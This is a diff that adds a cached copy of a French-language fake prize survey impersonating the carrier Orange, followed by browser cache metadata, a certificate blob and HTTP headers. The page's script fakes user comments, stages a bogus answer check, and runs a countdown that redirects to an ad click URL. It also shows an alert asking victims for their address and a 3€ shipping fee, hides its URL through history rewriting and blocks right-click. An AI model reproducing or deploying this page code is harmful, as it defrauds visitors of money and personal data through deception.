+									<p>Puis-je avoir une autre chance s'il vous plaît?</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a18 hidden">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Adeline Laborda</p>
+									<p class="date"><span class="bullet"> • </span>1 hour ago</p>
+								</div>
+								<div class="content">
+									<p>Fantastique! C'est la meilleure chose qui me soit arrivée cette année!</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+					</div>
+					<div style="display: none; margin-top: 24px;" class="comments_loader">
+						<img src="loader2.gif">
+					</div>
+					<div class="disqus_load_more">Charger plus de commentaires</div>
+				</div>
+			</div>
+	</div>
+	<script>
+		"use strict";
+		$( document ).ready( function () {
+			function e() {
+				var e = 1,
+					t = 3;
+				$( ".survey, .question.q-1" ).show(), $( ".survey .answer" ).click( function () {
+					$( ".question.q-" + e ).fadeOut( function () {
+						e < t ? ( e++, $( ".question.q-" + e ).fadeIn() ) : ( $( ".survey .answer" ).off(), n() )
+					} )
+				} )
+			}
+
+			function n() {
+				var e = 1,
+					n = 3;
+				$( ".survey .checkAnswers, .checkAnswers .step.s-" + e ).show();
+				var s = setInterval( function () {
+					$( ".checkAnswers .step.s-" + e ).fadeOut( function () {
+						e < n ? ( e++, $( ".checkAnswers .step.s-" + e ).fadeIn() ) : ( t(), clearInterval( s ) )
+					} )
+				}, 2e3 )
+			}
+
+			function t() {
+				$( ".survey .showprize, #comments_wrapper" ).show(), s();
+				var e = 179,
+					n = document.getElementById( "timer" );
+				setInterval( function () {
+					e--, e <= 0 && ( location.href = "https://seates-clable.com/click" ), n.innerText = Math.floor( e / 60 ) + ":" + ( "0" + e % 60 ).substr( -2 )
+				}, 1e3 )
+			}
+
+			function s() {
+				setInterval( function () {
+					r = !r, r ? $( ".restant.blinking" ).css( {
+						color: "#fff"
+					} ) : $( ".restant.blinking" ).css( {
+						color: "#FF6600"
+					} )
+				}, 500 )
+			}
+			document.getElementById( "cta" ).onclick = function () {
+				window.onbeforeunload = null, "instructions" in _ && alert( "**********\n\nVotre iPhone X d’Apple est réservé !\n\nInstructions :\n\n1. Cliquez sur « Accepter » pour réserver votre iPhone X d’Apple.\n\n2. Renseignez votre adresse électronique ainsi que votre adresse pour recevoir GRATUITEMENT votre Apple iPhone X d’Apple.\n\n3. Payez uniquement 3€ pour les frais d’envoi afin de pouvoir recevoir votre iPhone X.\n\n\n\n**********" )
+			}, e();
+			var o = !1;
+			$( ".disqus_load_more" ).click( function () {
+				$( ".comments_loader" ).slideDown( function () {
+					setTimeout( function () {
+						o || ( $( ".comments_loader" ).slideUp(), $( ".disqus_comment.hidden" ).show( function () {
+							o = !0
+						} ) )
+					}, 2e3 )
+				} )
+			} );
+			var r = !0;
+			$( ".ctabutton.disabled" ).click( function () {
+				alert( "Lo sentimos, este premio está fuera de stock!\n\nPor favor seleccione otro premio!" )
+			} )
+		} )
+	</script>
+
+			<script>
+var parameters = location.href.split('?')[1];
+if (typeof parameters === "undefined") {
+	parameters = "";
+}else{
+	parameters = "?"+parameters;
+};
+window.history.replaceState("", "", "/vainqueur-du-jour/"+parameters);
+
+$(document).bind('keydown keypress', 'ctrl+s', function(){
+  $('#save').click(); 
+  return false;
+});
+
+document.onmousedown = function(e){
+	if(e.button==2){
+		alert("");
+		return false;    
+	}
+}
+</script>
+
+</body></html>W��bO0      [�n�[�n�?u�:      {    :https://orange.programme-de-fidelisation.net/iphone-x/c/pop/orange/index.html?ip=80.12.37.241&cep=ncELRsM29-qK8NImKlyMd8AizfsK6iszpgmQPthGel8fGEQzBMRFRXmoNWkFxpmUPEczBJVpTj4PTU7wsegWOnCgT97qziQGStxSdU-_lQW25eHKWR-66uhKGL0GD1-KhztojOW-yuM54H2pEB4QUrUCtckl0b4zAZJ3QSy2eaIh1izvIzBu_xPyO4YXwTj5ETZsVKCMSlSFG-wyjuaj4Jwhg7HTM6GAiNw61M1wtW4dUWujy04p5Dw1Tufhbyc6UyihEQuBF5GhOE3b4wX09TYA9YqNTCFQCBe5nA2FTB6jmBs03OoKQ5vyd3xcdvyfqdyXwcUnOitVoyFlMaAY43n6KXfCSQsaevfYRn8hhsk&zone=1490295-1714559646-0&lang=EN&time=1535995620&campaing=95205420&ban=21804804&ssp=&udid=&org=Orange%20Mobile&advertiser=76327&clickid=15359956121342973425246480182355595 necko:classified 1 strongly-framed 1 security-info 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 request-method GET response-head HTTP/2.0 200 OK
+content-type: text/html
+content-length: 34570
+date: Wed, 04 Jul 2018 15:13:14 GMT
+last-modified: Tue, 03 Jul 2018 20:01:40 GMT
+etag: "d13216f7696943a69eaa1e336ea2a0f1"
+accept-ranges: bytes
+server: AmazonS3
+age: 5710
+x-cache: Hit from cloudfront
+via: 1.1 f56f6cfb430f06cacbdee0d3474cd27e.cloudfront.net (CloudFront)
+x-amz-cf-id: 8sgPZEG9UjpUBHfFraCZCwS8l8fdjsKpP3GRYD3IZpDMbORpZfxYzw==
+X-Firefox-Spdy: h2
+ original-response-headers content-type: text/html
+content-length: 34570
+date: Wed, 04 Jul 2018 15:13:14 GMT
+last-modified: Tue, 03 Jul 2018 20:01:40 GMT
+etag: "d13216f7696943a69eaa1e336ea2a0f1"
+accept-ranges: bytes
+server: AmazonS3
+age: 5710
+x-cache: Hit from cloudfront
+via: 1.1 f56f6cfb430f06cacbdee0d3474cd27e.cloudfront.net (CloudFront)
+x-amz-cf-id: 8sgPZEG9UjpUBHfFraCZCwS8l8fdjsKpP3GRYD3IZpDMbORpZfxYzw==
+X-Firefox-Spdy: h2
+ uncompressed-len 0 predictor::resource-count 5 predictor::https://orange.programme-de-fidelisation.net/iphone-x/c/pop/orange/jquery-3.1.0.min.js.download 1,1,1535995621,4097 net-response-time-onstart 185 net-response-time-onstop 255 predictor::https://orange.programme-de-fidelisation.net/iphone-x/c/pop/orange/orange.png 1,1,1535995621,4097 predictor::https://orange.programme-de-fidelisation.net/iphone-x/c/pop/orange/xxx.png 1,1,1535995621,4097 predictor::https://orange.programme-de-fidelisation.net/iphone-x/c/pop/orange/disqus_hr.gif 1,1,1535995621,4097 predictor::https://orange.programme-de-fidelisation.net/iphone-x/c/pop/orange/loader2.gif 1,1,1535995621,4097   �
